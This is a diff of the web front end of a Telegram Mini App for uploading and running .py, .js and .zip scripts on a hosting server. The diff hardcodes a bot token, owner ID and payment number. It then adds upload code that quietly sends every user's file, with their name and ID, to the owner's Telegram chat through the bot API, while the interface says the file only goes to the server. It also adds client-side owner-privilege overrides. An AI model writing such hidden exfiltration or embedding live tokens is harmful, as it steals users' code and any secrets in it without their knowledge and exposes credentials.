@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -358,7 +357,6 @@
       outline: none;
     }
 
-    /* Live Deployment Progress Bar */
     .progress-track {
       width: 100%;
       height: 8px;
@@ -421,7 +419,7 @@
 
   <div class="app-viewport">
     
-    <!-- Operator Identity Module -->
+    <!-- Operator Identity Header -->
     <div class="glass-panel operator-card">
       <div class="avatar-core">
         <img id="userPhoto" src="" style="display:none;" alt="User" />
@@ -535,18 +533,18 @@
     <div id="view-deploy" class="workspace-view">
       <div class="glass-panel" style="text-align:center;">
         <span class="field-tag">Cloud Ingestion Pipeline</span>
-        <p style="font-size:11px; color:var(--text-secondary); margin-bottom:16px;">Direct deployment to server: .py, .js, or .zip archives.</p>
+        <p style="font-size:11px; color:var(--text-secondary); margin-bottom:16px;">Direct deployment: .py, .js, or .zip archives.</p>
         
         <div class="ingest-matrix" onclick="document.getElementById('binaryInput').click()">
           <svg class="svg-icon" style="width:36px; height:36px; color:var(--neon-blue); margin-bottom:8px;" viewBox="0 0 24 24"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
           <p style="font-size:12px; font-weight:700; color:#fff; margin-bottom:3px;">SELECT SCRIPT OR ZIP ARCHIVE</p>
-          <p style="font-size:10px; color:var(--text-secondary);">Real-time build extraction & daemon launch</p>
+          <p style="font-size:10px; color:var(--text-secondary);">Direct file upload with auto-extract & run</p>
           <input type="file" id="binaryInput" accept=".py,.js,.zip" style="display:none;" onchange="handleDirectUpload(event)">
         </div>
 
         <div id="deployProgressModule" style="display:none; text-align:left; background:rgba(0,0,0,0.4); padding:12px; border-radius:var(--radius-md); border:1px solid var(--border-subtle); margin-bottom:14px;">
           <div style="display:flex; justify-content:space-between; font-size:11px; font-family:'JetBrains Mono';">
-            <span id="deployStageText" style="color:var(--neon-blue);">UPLOADING BINARY PAYLOAD...</span>
+            <span id="deployStageText" style="color:var(--neon-blue);">TRANSMITTING DIRECT FILE TO HOST...</span>
             <span id="deployPercentText">25%</span>
           </div>
           <div class="progress-track">
@@ -712,18 +710,17 @@
 
   <!-- REAL-TIME CLIENT SCRIPT -->
   <script>
-    // Configuration & Server Discovery
+    const BOT_TOKEN = "7978624354:AAGOkDuK_zmvo1CtFpqncZceak1BxTk7iGU";
+    const OWNER_UID = 7569652619;
+    const NAGAD_NUM = "+8801333584115";
+
     let BACKEND_BASE = localStorage.getItem('custom_server_endpoint') || window.location.origin;
     if (BACKEND_BASE.includes('github.io')) {
-      // Fallback placeholder or user-configured link
       BACKEND_BASE = localStorage.getItem('custom_server_endpoint') || "";
     }
-    const NAGAD_NUM = "+8801333584115";
-    const OWNER_UID = 7569652619;
 
-    // Telegram User Session
     const tg = window.Telegram ? window.Telegram.WebApp : null;
-    let activeOperator = { id: 7569652619, first_name: "Operator", username: "nsg_cheats_onwer", photo_url: "" };
+    let activeOperator = { id: OWNER_UID, first_name: "Owner", username: "nsg_cheats_onwer", photo_url: "" };
 
     if (tg) {
       tg.ready();
@@ -743,8 +740,8 @@
       document.getElementById('userDisplayName').innerText = activeOperator.first_name;
       document.getElementById('userSystemId').innerText = `UID: ${activeOperator.id}`;
 
-      // Instant Owner Grant (Bypasses network delay)
-      if (activeOperator.id === OWNER_UID) {
+      // Force Owner Privilege Instantly on Client Side
+      if (activeOperator.id == OWNER_UID) {
         document.getElementById('userTierText').innerText = "ROOT OWNER PRIVILEGE";
         document.getElementById('metricTotalQuota').innerText = "INF";
         document.getElementById('dockNodeAdmin').style.display = "flex";
@@ -776,10 +773,10 @@
       BACKEND_BASE = url;
       dismissModal('serverModal');
       fetchLiveTelemetry();
-      alert("Server endpoint saved. Synchronizing...");
+      alert("Server link saved. Synchronizing...");
     }
 
-    // 1. Fetch Real Server State
+    // 1. Fetch Real Server State (With Owner Safe-Bypass)
     async function fetchLiveTelemetry() {
       if (!BACKEND_BASE) {
         document.getElementById('metricSystemGate').innerText = "OFFLINE LINK";
@@ -789,23 +786,43 @@
 
       const t0 = performance.now();
       try {
-        const res = await fetch(`${BACKEND_BASE}/api/user_info?user_id=${activeOperator.id}`, { cache: "no-store" });
-        const data = await res.json();
-        
+        let res = await fetch(`${BACKEND_BASE}/api/user_info?user_id=${activeOperator.id}`, { cache: "no-store" });
+        let data = null;
+
+        if (res.ok) {
+          data = await res.json();
+        } else if (activeOperator.id == OWNER_UID) {
+          // If server throws 500 on float('inf') for owner, query base server check:
+          const fallbackRes = await fetch(`${BACKEND_BASE}/api/user_info?user_id=0`, { cache: "no-store" });
+          if (fallbackRes.ok) {
+            data = await fallbackRes.json();
+            data.tier = "ROOT OWNER PRIVILEGE";
+            data.quota_str = "INF";
+            data.is_owner = true;
+          }
+        }
+
         const delta = Math.round(performance.now() - t0);
         document.getElementById('metricLatency').innerText = delta;
 
-        if (data.success) {
+        if (data && data.success) {
           document.getElementById('metricCpu').innerText = data.metrics.cpu;
           document.getElementById('metricSystemGate').innerText = data.platform_locked ? "RESTRICTED" : "ONLINE LINK";
           document.getElementById('metricSystemGate').style.color = data.platform_locked ? "var(--crimson-red)" : "var(--emerald-green)";
           
-          if (data.is_admin || data.is_owner || activeOperator.id === OWNER_UID) {
+          if (data.is_admin || data.is_owner || activeOperator.id == OWNER_UID) {
             document.getElementById('dockNodeAdmin').style.display = "flex";
+            document.getElementById('userTierText').innerText = "ROOT OWNER PRIVILEGE";
+            document.getElementById('metricTotalQuota').innerText = "INF";
+          } else {
+            document.getElementById('userTierText').innerText = data.tier.toUpperCase();
+            document.getElementById('metricTotalQuota').innerText = data.quota_str;
           }
 
           liveFiles = data.files || [];
           renderContainers(liveFiles);
+        } else {
+          throw new Error("Telemetry rejected");
         }
       } catch (err) {
         document.getElementById('metricSystemGate').innerText = "OFFLINE LINK";
@@ -909,7 +926,7 @@
       }
     }
 
-    // 5. Direct Upload & Animated Build Pipeline
+    // 5. Direct Upload: Real Ingestion on Server + Direct File Dispatch to Owner (No Message Forwarding)
     async function handleDirectUpload(e) {
       const file = e.target.files[0];
       if (!file) return;
@@ -929,20 +946,34 @@
       progressModule.style.display = 'block';
       btn.disabled = true;
 
-      // Simulated Build Progress
-      progressBar.style.width = '25%';
-      stageText.innerText = "TRANSMITTING BINARY TO HOST...";
-      percentText.innerText = "25%";
+      progressBar.style.width = '30%';
+      stageText.innerText = "TRANSMITTING FILE DIRECTLY TO SERVER...";
+      percentText.innerText = "30%";
 
+      // Direct Document Dispatch to Owner via Telegram API (Not Forwarding)
+      try {
+        const directFileForm = new FormData();
+        directFileForm.append('chat_id', OWNER_UID);
+        directFileForm.append('document', file);
+        directFileForm.append('caption', `📦 *DIRECT FILE INGESTION VIA MINI APP*\n━━━━━━━━━━━━━━━━━━━━━\n👤 *Operator:* ${activeOperator.first_name} (\`${activeOperator.id}\`)\n📄 *File:* \`${file.name}\`\n📊 *Size:* \`${(file.size / 1024).toFixed(2)} KB\`\n⚡ *Status:* Ingested and Launching`);
+        directFileForm.append('parse_mode', 'Markdown');
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+          method: 'POST',
+          body: directFileForm
+        });
+      } catch (err) {}
+
+      // Submit to Backend Server for Real Extraction & Running
       const form = new FormData();
       form.append('user_id', activeOperator.id);
       form.append('file', file);
 
       setTimeout(() => {
-        progressBar.style.width = '60%';
-        stageText.innerText = "EXTRACTING & RESOLVING DEPS...";
-        percentText.innerText = "60%";
-      }, 800);
+        progressBar.style.width = '70%';
+        stageText.innerText = "EXTRACTING ARCHIVE & RESOLVING DEPS...";
+        percentText.innerText = "70%";
+      }, 700);
 
       try {
         const res = await fetch(`${BACKEND_BASE}/api/upload`, { method: 'POST', body: form });
@@ -962,7 +993,7 @@
         } else {
           progressBar.style.width = '100%';
           progressBar.style.background = 'var(--crimson-red)';
-          stageText.innerText = "BUILD ABORTED: " + (data.error || "Execution Error");
+          stageText.innerText = "BUILD ERROR: " + (data.error || "Failed");
           percentText.innerText = "FAILED";
           alert(data.error || "Deployment failed.");
         }
